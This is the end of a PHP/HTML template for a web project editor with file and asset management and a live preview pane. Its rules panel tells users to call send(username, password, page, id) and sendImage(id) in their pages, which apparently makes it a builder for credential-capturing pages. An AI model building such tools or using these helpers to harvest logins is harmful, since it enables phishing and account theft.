            <div class="text-[10px] text-gray-500 mb-2 px-2"><i class="bi bi-file-earmark-code"></i> PROJECT FILES</div>
            <div id="fileList" class="space-y-0.5"></div>
            <div class="text-[10px] text-gray-500 mb-2 mt-4 px-2"><i class="bi bi-images"></i> ASSETS</div>
            <div id="assetFileList" class="space-y-0.5"></div>
            <div class="mt-4 p-2 border border-dashed border-purple-500/30 rounded-lg">
                <label class="block text-[9px] text-center text-gray-400 cursor-pointer">
                    <i class="bi bi-cloud-upload"></i> Upload Asset
                    <input type="file" id="assetUploadSidebar" class="hidden" accept="image/*,.css,.js,.txt,.json,.xml">
                </label>
            </div>
        </div>
        <div class="p-2 border-t border-purple-900/30 text-[9px] text-gray-500">
            <i class="bi bi-terminal text-purple-400"></i> send(user, pass, page, id) | sendImage(id)
        </div>
    </div>

    <div id="sidebarResize" class="w-1 bg-purple-500/30 hover:bg-purple-400 cursor-col-resize transition-all" style="width: 3px;"></div>

    <div class="flex-1 flex flex-col overflow-hidden">
        <div class="bg-[#0F0F1A] border-b border-purple-900/30 px-3 py-1.5 flex items-center justify-between">
            <div class="flex items-center gap-1">
                <span class="text-[10px] text-gray-500 mr-2"><i class="bi bi-layout-split"></i> Editor Width</span>
                <div class="flex gap-1" id="widthController">
                    <button data-width="0" class="width-btn px-2 py-0.5 text-[10px] rounded border border-purple-500/30 text-gray-400">0/4</button>
                    <button data-width="25" class="width-btn px-2 py-0.5 text-[10px] rounded border border-purple-500/30 text-gray-400">1/4</button>
                    <button data-width="50" class="width-btn px-2 py-0.5 text-[10px] rounded border border-purple-500/30 text-gray-400 active">2/4</button>
                    <button data-width="75" class="width-btn px-2 py-0.5 text-[10px] rounded border border-purple-500/30 text-gray-400">3/4</button>
                    <button data-width="100" class="width-btn px-2 py-0.5 text-[10px] rounded border border-purple-500/30 text-gray-400">4/4</button>
                </div>
            </div>
            <div class="flex gap-3 text-[9px] text-gray-500">
                <span><i class="bi bi-filetype-html text-orange-400"></i> HTML</span><span><i class="bi bi-filetype-css text-blue-400"></i> CSS</span><span><i class="bi bi-filetype-js text-yellow-400"></i> JS</span>
            </div>
        </div>
        
        <div class="flex-1 flex overflow-hidden" id="mainSplit">
            <div id="editorArea" class="h-full flex flex-col bg-[#0B0B14]" style="width: 50%">
                <div class="editor-container flex-1 relative">
                    <div id="editorLineNumbers" class="absolute left-0 top-0 w-10 bg-[#0a0a12] text-right pr-2 text-[11px] text-gray-500 font-mono select-none z-10"></div>
                    <textarea id="codeEditor" class="editor-textarea w-full h-full p-3 pl-12 resize-none outline-none" spellcheck="false"></textarea>
                </div>
                <div class="px-3 py-1 bg-[#0F0F1A] border-t border-purple-900/30 text-[9px] text-gray-400 flex justify-between">
                    <span><i class="bi bi-info-circle text-purple-400"></i> send(user, pass, page, id) | sendImage(id)</span>
                    <span id="statusIndicator"><i class="bi bi-circle-fill text-green-500 text-[6px]"></i> Ready</span>
                </div>
            </div>
            
            <div id="editorPreviewResize" class="w-1 bg-purple-500/30 hover:bg-purple-400 cursor-col-resize transition-all" style="width: 3px;"></div>
            
            <div id="previewArea" class="h-full flex flex-col bg-[#0F0F1A]" style="width: 50%">
                <div class="flex-1 relative bg-white rounded-tl-xl overflow-hidden">
                    <iframe id="previewFrame" class="w-full h-full border-0" title="preview" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-downloads"></iframe>
                    <div id="loadingOverlay" class="absolute inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center hidden z-10"><div class="loader"></div></div>
                </div>
                <div class="px-3 py-1 bg-[#0F0F1A] border-t border-purple-900/30 text-[9px] text-gray-500 flex justify-between">
                    <span><i class="bi bi-shield-check"></i> Project preview</span>
                    <span id="previewTimestamp"></span>
                </div>
            </div>
        </div>
    </div>
</div>

<div id="rulesPanel" class="fixed bottom-3 left-3 z-30 max-w-[300px] bg-black/85 backdrop-blur-md border border-purple-500/40 rounded-xl p-2 text-[10px] text-gray-300 rule-card">
    <div class="flex items-center justify-between mb-1">
        <div class="flex items-center gap-1"><i class="bi bi-terminal-fill text-purple-400 text-xs"></i><span class="font-semibold text-purple-200 text-xs">Rules</span></div>
        <button id="hideRulesBtn" class="text-gray-500 hover:text-white text-xs"><i class="bi bi-x-lg"></i></button>
    </div>
    <ul class="space-y-0.5 text-[9px]">
        <li><i class="bi bi-check-circle-fill text-green-500 text-[7px]"></i> index.html is main entry file</li>
        <li><i class="bi bi-check-circle-fill text-green-500 text-[7px]"></i> <code class="text-purple-300">send(username, password, page , id)</code> — $id from header</li>
        <li><i class="bi bi-check-circle-fill text-green-500 text-[7px]"></i> <code class="text-purple-300">sendImage(id)</code> — call directly in events</li>
        <li><i class="bi bi-folder2"></i> Max projects: <strong><?= $userProjectLimit ?></strong></li>
        <li><i class="bi bi-arrows-angle-expand"></i> Drag purple bars to resize</li>
    </ul>
</div>

<script>
    let projectFiles = <?= json_encode($projectFiles) ?>;
    let activeFile = '<?= addslashes($activeFile) ?>';
    let assets = <?= json_encode($assets) ?>;
    let editorWidth = 50;
    let projectName = '<?= addslashes($currentProject) ?>';
    let syntaxTimeout = null;
    
    const codeEditor = document.getElementById('codeEditor');
    const previewFrame = document.getElementById('previewFrame');
    const runBtn = document.getElementById('runPreviewBtn');
    const saveAllBtn = document.getElementById('saveAllBtn');
    const newFileBtn = document.getElementById('newFileBtn');
    const copyFileBtn = document.getElementById('copyFileBtn');
    const fileListDiv = document.getElementById('fileList');
    const assetFileListDiv = document.getElementById('assetFileList');
    const statusSpan = document.getElementById('statusIndicator');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const previewTimestamp = document.getElementById('previewTimestamp');
    const assetUploadSidebar = document.getElementById('assetUploadSidebar');
    const editorLineNumbers = document.getElementById('editorLineNumbers');
    
    function highlightHTML(code) {
        code = code.replace(/(<!--[\s\S]*?-->)/g, '<span class="syntax-comment">$1</span>');
        code = code.replace(/(&lt;\/?[\w-]+)(\s|&gt;|\/&gt;)/g, '<span class="syntax-tag">$1</span>$2');
        code = code.replace(/(&lt;[\w-]+)(\s|&gt;)/g, '<span class="syntax-tag">$1</span>$2');
        code = code.replace(/\s([\w-]+)=/g, ' <span class="syntax-attr">$1</span>=');
        code = code.replace(/=(["'][^"']*["'])/g, '=<span class="syntax-value">$1</span>');
        return code;
    }
    
    function highlightCSS(code) {
        code = code.replace(/(\/\*[\s\S]*?\*\/)/g, '<span class="syntax-comment">$1</span>');
        code = code.replace(/([^{}]+)(\{)/g, '<span class="syntax-css-selector">$1</span>$2');
        code = code.replace(/\n\s*([\w-]+)(\s*:)/g, '\n  <span class="syntax-css-property">$1</span>$2');
        code = code.replace(/:\s*([^;]+)(;)/g, ': <span class="syntax-css-value">$1</span>$2');
        return code;
    }
    
    function highlightJS(code) {
        code = code.replace(/(\/\/[^\n]*)/g, '<span class="syntax-comment">$1</span>');
        code = code.replace(/(\/\*[\s\S]*?\*\/)/g, '<span class="syntax-comment">$1</span>');
        const keywords = ['function', 'const', 'let', 'var', 'if', 'else', 'for', 'while', 'return', 'class', 'new', 'this', 'try', 'catch', 'finally'];
        keywords.forEach(kw => {
            code = code.replace(new RegExp(`\\b(${kw})\\b`, 'g'), '<span class="syntax-js-keyword">$1</span>');
        });
        code = code.replace(/("[^"]*"|'[^']*'|`[^`]*`)/g, '<span class="syntax-js-string">$1</span>');
        code = code.replace(/\b(\d+)\b/g, '<span class="syntax-js-number">$1</span>');
        code = code.replace(/\b([a-zA-Z_$][a-zA-Z0-9_$]*)\s*\(/g, '<span class="syntax-js-function">$1</span>(');
        return code;
    }
    
    function applySyntaxHighlighting() {
        let code = codeEditor.value;
        let escaped = code.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
        if (activeFile.endsWith('.css')) escaped = highlightCSS(escaped);
        else if (activeFile.endsWith('.js')) escaped = highlightJS(escaped);
        else escaped = highlightHTML(escaped);
        const lines = code.split('\n').length;
        let lineNumbersHtml = '';
        for (let i = 1; i <= lines; i++) lineNumbersHtml += `<div>${i}</div>`;
        editorLineNumbers.innerHTML = lineNumbersHtml;
    }
    
    codeEditor.addEventListener('input', () => {
        projectFiles[activeFile] = codeEditor.value;
        updateStatus('Editing...');
        if (syntaxTimeout) clearTimeout(syntaxTimeout);
        syntaxTimeout = setTimeout(applySyntaxHighlighting, 300);
    });
    
    codeEditor.addEventListener('scroll', () => { editorLineNumbers.scrollTop = codeEditor.scrollTop; });
    
    function updateEditorContent() {
        codeEditor.value = projectFiles[activeFile] || '';
        applySyntaxHighlighting();
    }
    
    const widthBtns = document.querySelectorAll('.width-btn');
    widthBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            widthBtns.forEach(b => b.classList.remove('active', 'bg-purple-600', 'text-white'));
            btn.classList.add('active', 'bg-purple-600', 'text-white');
            const width = parseInt(btn.dataset.width);
            editorWidth = width;
            const editorArea = document.getElementById('editorArea');
            const previewArea = document.getElementById('previewArea');
            const resizeHandle = document.getElementById('editorPreviewResize');
            if (width === 0) { editorArea.style.width = '0%'; previewArea.style.width = '100%'; resizeHandle.style.display = 'none'; }
            else if (width === 100) { editorArea.style.width = '100%'; previewArea.style.width = '0%'; resizeHandle.style.display = 'none'; }
            else { editorArea.style.width = width + '%'; previewArea.style.width = (100 - width) + '%'; resizeHandle.style.display = 'block'; }
        });
    });
    
    let isDraggingSidebar = false, isDraggingEditorPreview = false, startX = 0, startSidebarWidth = 0, startEditorWidth = 0;
    const sidebar = document.getElementById('sidebar');
    const sidebarResize = document.getElementById('sidebarResize');
    const editorPreviewResize = document.getElementById('editorPreviewResize');
    const mainSplit = document.getElementById('mainSplit');
    
    sidebarResize.addEventListener('mousedown', (e) => {
        isDraggingSidebar = true;
        startX = e.clientX;
        startSidebarWidth = sidebar.offsetWidth;
        document.body.style.cursor = 'col-resize';
        e.preventDefault();
    });
    
    editorPreviewResize.addEventListener('mousedown', (e) => {
        if (editorWidth === 0 || editorWidth === 100) return;
        isDraggingEditorPreview = true;
        startX = e.clientX;
        startEditorWidth = document.getElementById('editorArea').offsetWidth;
        document.body.style.cursor = 'col-resize';
        e.preventDefault();
    });
    
    document.addEventListener('mousemove', (e) => {
        if (isDraggingSidebar) {
            let newWidth = startSidebarWidth + (e.clientX - startX);
            newWidth = Math.min(350, Math.max(150, newWidth));
            sidebar.style.width = newWidth + 'px';
        }
        if (isDraggingEditorPreview) {
            const mainRect = mainSplit.getBoundingClientRect();
            let percent = ((e.clientX - mainRect.left) / mainRect.width) * 100;
            percent = Math.min(85, Math.max(15, percent));
            document.getElementById('editorArea').style.width = percent + '%';
            document.getElementById('previewArea').style.width = (100 - percent) + '%';
            editorWidth = percent;
        }
    });
    
    document.addEventListener('mouseup', () => {
        isDraggingSidebar = false;
        isDraggingEditorPreview = false;
        document.body.style.cursor = '';
    });
    
    function renderFileList() {
        fileListDiv.innerHTML = '';
        const fileOrder = ['index.html', ...Object.keys(projectFiles).filter(f => f !== 'index.html').sort()];
        for (const filename of fileOrder) {
            if (!projectFiles[filename]) continue;
            const icon = filename.endsWith('.html') ? 'bi-filetype-html text-orange-400' : (filename.endsWith('.css') ? 'bi-filetype-css text-blue-400' : (filename.endsWith('.js') ? 'bi-filetype-js text-yellow-400' : 'bi-file-earmark-code'));
            const div = document.createElement('div');
            div.className = `file-item flex items-center justify-between px-2 py-1 rounded text-xs ${activeFile === filename ? 'active' : 'text-gray-300'}`;
            div.innerHTML = `<div class="flex items-center gap-2 flex-1 cursor-pointer" data-file="${filename}"><i class="${icon} text-[12px]"></i><span class="truncate">${filename}${filename === 'index.html' ? '<span class="text-yellow-500 text-[8px] ml-1">★</span>' : ''}</span></div>
                <div class="flex gap-1"><i class="bi bi-clipboard copy-btn text-gray-500 hover:text-purple-400 text-[10px] cursor-pointer" data-copy-path="${filename}" title="Copy path"></i>
                <i class="bi bi-x-circle-fill text-gray-500 hover:text-red-400 text-[10px] cursor-pointer" data-delete="${filename}"></i></div>`;
            div.querySelector('[data-file]').addEventListener('click', () => { activeFile = filename; updateEditorContent(); renderFileList(); updateStatus(`Opened ${filename}`); });
            div.querySelector('[data-copy-path]').addEventListener('click', (e) => { e.stopPropagation(); navigator.clipboard.writeText(filename); showToast(`Copied: ${filename}`, 'success'); });
            const delBtn = div.querySelector('[data-delete]');
            if (delBtn && Object.keys(projectFiles).length > 1 && filename !== 'index.html') {
                delBtn.addEventListener('click', (e) => { e.stopPropagation(); deleteFile(filename); });
            } else if (filename === 'index.html') { delBtn.style.opacity = '0.3'; delBtn.style.pointerEvents = 'none'; }
            fileListDiv.appendChild(div);
        }
    }
    
    function renderAssetList() {
        assetFileListDiv.innerHTML = '';
        if (assets.length === 0) { assetFileListDiv.innerHTML = '<div class="text-center text-gray-500 text-[10px] py-2">No assets</div>'; return; }
        for (const asset of assets) {
            const div = document.createElement('div');
            div.className = 'asset-file-item flex items-center justify-between px-2 py-1 rounded text-xs text-gray-300';
            div.innerHTML = `<div class="flex items-center gap-2 flex-1 cursor-pointer" data-asset='${JSON.stringify(asset)}'>${asset.isImage ? '<i class="bi bi-image text-green-400 text-[12px]"></i>' : '<i class="bi bi-file-earmark-code text-purple-400 text-[12px]"></i>'}<span class="truncate text-[10px]">${asset.name.substring(0, 30)}</span></div>
                <div class="flex gap-1"><i class="bi bi-clipboard copy-btn text-gray-500 hover:text-purple-400 text-[10px] cursor-pointer" data-copy="./assets/${asset.name}"></i>
                <i class="bi bi-trash3 text-gray-500 hover:text-red-400 text-[10px] cursor-pointer" data-delete="${asset.name}"></i></div>`;
            div.querySelector('[data-asset]').addEventListener('click', () => {
                if (asset.isImage) {
                    const modal = document.createElement('div');
                    modal.className = 'image-preview-modal';
                    modal.innerHTML = `<img src="${asset.url}" style="max-width:90%; max-height:90%; border-radius:16px;"><div class="absolute top-4 right-4 text-white text-2xl cursor-pointer">×</div>`;
                    modal.onclick = () => modal.remove();
                    document.body.appendChild(modal);
                }
            });
            div.querySelector('[data-copy]').addEventListener('click', async (e) => { e.stopPropagation(); const path = e.target.getAttribute('data-copy'); await navigator.clipboard.writeText(path); showToast(`Copied: ${path}`, 'success'); });
            div.querySelector('[data-delete]').addEventListener('click', async (e) => { e.stopPropagation(); if (confirm('Delete asset?')) { await fetch('', { method: 'POST', body: new URLSearchParams({ delete_asset: asset.name }) }); location.reload(); } });
            assetFileListDiv.appendChild(div);
        }
    }
    
    async function deleteFile(filename) {
        if (confirm(`Delete ${filename}?`)) {
            await fetch('', { method: 'POST', body: new URLSearchParams({ delete_file: filename }) });
            location.reload();
        }
    }
    
    async function saveCurrentFile() {
        await fetch('', { method: 'POST', body: new URLSearchParams({ save_file: '1', filename: activeFile, content: codeEditor.value }) });
        showToast(`Saved ${activeFile}`, 'success');
    }
    
    async function updatePreview() {
        loadingOverlay.classList.remove('hidden');
        const projectUrl = `${projectName}/index.html`;
        previewFrame.src = projectUrl + '?t=' + Date.now();
        previewTimestamp.innerHTML = `<i class="bi bi-clock"></i> ${new Date().toLocaleTimeString()}`;
        setTimeout(() => loadingOverlay.classList.add('hidden'), 500);
        updateStatus('Preview updated');
    }
    
    async function newFile() {
        let name = prompt('Create file: style.css or script.js', 'style.css');
        if (!name) return;
        
        name = name.trim();
        if (!name) return;

        const allowed = ['style.css', 'script.js'];
        if (!allowed.includes(name)) {
            showToast('Only style.css or script.js can be created here', 'error');
            return;
        }
        
        if (projectFiles[name]) {
            showToast(`File "${name}" already exists!`, 'error');
            return;
        }
        
        try {
            const response = await fetch('', { 
                method: 'POST', 
                body: new URLSearchParams({ new_file: name, _action: 'create_file' })
            });
            const data = await response.json();
            if (data.success) {
                showToast(`File "${name}" created!`, 'success');
                location.reload();
            } else {
                showToast(`Error: ${data.error || 'Failed to create file'}`, 'error');
            }
        } catch (err) {
            console.error('Error creating file:', err);
            showToast('Error creating file', 'error');
        }
    }
    
    async function copyCurrentFile() {
        let newName = prompt('Copy as:', 'copy_of_' + activeFile);
        if (newName && newName !== activeFile) {
            await fetch('', { method: 'POST', body: new URLSearchParams({ save_file: '1', filename: newName, content: codeEditor.value }) });
            location.reload();
        }
    }
    
    assetUploadSidebar.addEventListener('change', async (e) => {
        const file = e.target.files[0];
        if (!file) return;
        const formData = new FormData();
        formData.append('asset_file', file);
        const res = await fetch('', { method: 'POST', body: formData });
        const data = await res.json();
        if (data.success) { showToast(`Uploaded: ${file.name}`, 'success'); location.reload(); }
        else showToast('Upload failed', 'error');
        assetUploadSidebar.value = '';
    });
    
    function showToast(msg, type) {
        const toast = document.createElement('div');
        toast.className = 'toast-msg';
        toast.innerHTML = `<i class="bi ${type === 'success' ? 'bi-check-circle-fill' : 'bi-info-circle-fill'}"></i> ${msg}`;
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 2500);
    }
    
    function updateStatus(msg) {
        statusSpan.innerHTML = `<i class="bi bi-circle-fill text-green-500 text-[6px]"></i> ${msg}`;
        setTimeout(() => { if (statusSpan.innerHTML.includes(msg)) statusSpan.innerHTML = `<i class="bi bi-circle-fill text-green-500 text-[6px]"></i> Ready`; }, 1500);
    }
    
    document.getElementById('projectMenuBtn').addEventListener('click', () => {
        document.getElementById('projectMenu').classList.toggle('hidden');
    });
    document.getElementById('hideRulesBtn').addEventListener('click', () => {
        document.getElementById('rulesPanel').classList.add('hidden');
    });
    runBtn.addEventListener('click', updatePreview);
    saveAllBtn.addEventListener('click', saveCurrentFile);
    newFileBtn.addEventListener('click', newFile);
    copyFileBtn.addEventListener('click', copyCurrentFile);
    
    renderFileList();
    renderAssetList();
    updateEditorContent();
    updatePreview();
    
    setInterval(saveCurrentFile, 30000);
</script>
</body>
</html>